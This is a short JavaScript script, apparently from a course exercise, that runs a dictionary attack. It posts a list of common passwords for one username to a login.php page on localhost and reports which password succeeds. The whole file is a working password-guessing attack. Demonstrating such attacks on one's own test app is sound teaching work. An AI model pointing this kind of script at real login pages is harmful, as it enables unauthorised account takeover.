const url = 'http://localhost/viikko3/operations/login.php';

const testData = [
    '12345',
    'password',
    '123456',
    'password123',
    'admin',
    'qwerty',
    'password1234',
    'password12345',
];

const login = async (password) => {
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'username=ilkkamtk&password=' + password,
        });
        const result = await response.text();
        console.log(password, result);
        if(result.includes('media_id')) {
            console.log(`Password found: ${password}`);
        }
    } catch (error) {
        console.error(error);
    }
};

testData.forEach(data => login(data));
